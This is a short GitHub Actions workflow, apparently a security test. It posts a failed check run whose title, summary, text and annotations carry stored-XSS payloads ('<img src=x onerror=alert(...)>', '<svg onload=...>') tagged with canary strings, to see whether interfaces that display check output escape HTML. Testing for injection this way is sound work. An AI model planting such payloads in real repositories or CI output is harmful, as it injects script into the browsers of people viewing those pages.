name: check-xss
on: push
permissions:
  checks: write
  contents: read
jobs:
  c:
    runs-on: ubuntu-latest
    steps:
      - name: malicious check run
        run: |
          curl -s -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
            "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/check-runs" \
            -d "{\"name\":\"xss-check\",\"head_sha\":\"$GITHUB_SHA\",\"status\":\"completed\",\"conclusion\":\"failure\",\"output\":{\"title\":\"<img src=x onerror=alert(1)>CHK-TITLE\",\"summary\":\"<img src=x onerror=alert(2)> CHK-SUM-CANARY\",\"text\":\"<svg onload=alert(3)> txt\",\"annotations\":[{\"path\":\"README.md\",\"start_line\":1,\"end_line\":1,\"annotation_level\":\"failure\",\"message\":\"<img src=x onerror=alert(4)> CHK-ANNOT-CANARY\",\"raw_details\":\"<img src=x onerror=alert(5)> CHK-RAW\"}]}}"
        env:
          GITHUB_TOKEN: ${{ github.token }}